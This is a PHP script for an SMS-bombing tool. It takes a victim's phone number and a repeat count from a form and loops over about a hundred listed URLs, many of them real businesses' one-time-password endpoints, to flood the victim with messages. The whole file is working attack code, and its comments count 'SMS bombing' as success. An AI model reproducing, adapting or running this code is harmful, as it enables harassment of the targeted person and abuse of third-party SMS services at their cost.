<?php

// Function to send SMS using given API URL and parameters
function sendSMS($api_url, $number, $amount) {
    $url = $api_url . urlencode($number);

    // Send multiple requests based on $amount
    for ($i = 0; $i < $amount; $i++) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($ch);
        $error = curl_error($ch);

        curl_close($ch);

        if ($response === false) {
            return false; // Return false on failure
        }
    }

    return true; // Return true when SMS bombing is successful
}

// List of API URLs
$api_urls = [
    "https://rsbd.xyz/smsbom/api.php?number=",
    "https://monsterteambd.co/RSBD/API/SMS/admissionbd.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/aibl.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/ali2bd.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/applink.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/arogga.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/bdtikets.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/bdtikets2.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/betonbook.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/bikroy.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/bioscope.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/bkash-biz.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/bl.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/bongobd.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/busbdlogin.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/byjus.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/chainaonline.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/chakrajan.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/chorki.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/cinematic.php?phone=",
    "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=",
    "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=",
    "https://ultranetrn.com.br/fonts/api.php?number=",
    "https://monsterteambd.co/RSBD/API/SMS/cineplex.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/cinespot.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/circel.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/dhakabank.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/dipto.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/dmss.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/doctime.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/ecuriar.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/easy.com.bd.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/enobazar.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/entertainment.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/flexi-plan.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/fliper.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/fundesh.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/ghuri.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/gp.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/gpay.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/gpshop.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/grameendh.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/helth.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/helth-login.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/helth-reg.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/hisab-express.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/hisabelogin.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/hisabereg.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/hisabpati.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/hlpl.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/iqra.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/ivr.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/jatri.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/jeetwinbd.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/jotno.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/khaodao.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/kirebd.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/lazzpharma.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/lbfl.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/mcbaffiliate.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/mithai.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/mojaenglish.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/mokam.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/moveon.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/nesco.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/obhai.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/ousodhpotro.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/paperflay.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/pathao.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/pravanahelth.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/qcom.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/quizgiri.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/quiztime.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/redx.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/redx2.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/reseller-circel.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/robi-ivr-dorstep.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/robi-myoffer.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/robi-web.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/robi-web2.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/rootsedu.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/rtv-forget.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/rtv-reg.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/runcash.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/sadhin.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/sajgoj.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/sundarban.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/senorbeuty.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/sikho.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/somvob.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/sopoth-reg.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/sopoth-resend.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/sudokkho.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/sundarban.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/talikhata.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/tap.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/thebodyshop.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/tota.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/trusty.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/vdoc.php?phone=",
    "https://monsterteambd.co/RSBD/API/SMS/webacces.php?phone=",
    "https://bombapi.000webhostapp.com/oggy/api/all.php?phone=",
    // Add more API URLs here as needed
];

// Handle form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $number = $_POST["number"];
    $amount = $_POST["amount"];

    // Validate inputs
    if (empty($number) || empty($amount) || !is_numeric($amount) || $amount <= 0) {
        echo "Invalid input.";
        exit;
    }

    $bombing_success = false;

    // Iterate through all APIs and send SMS
    foreach ($api_urls as $api_url) {
        if (sendSMS($api_url, $number, $amount)) {
            $bombing_success = true;
        }
    }

    if ($bombing_success) {
        header("Location: index.php?status=success"); // Redirect with success status
    } else {
        header("Location: index.php?status=failure"); // Redirect with failure status
    }
} else {
    echo "Invalid request method.";
}
?>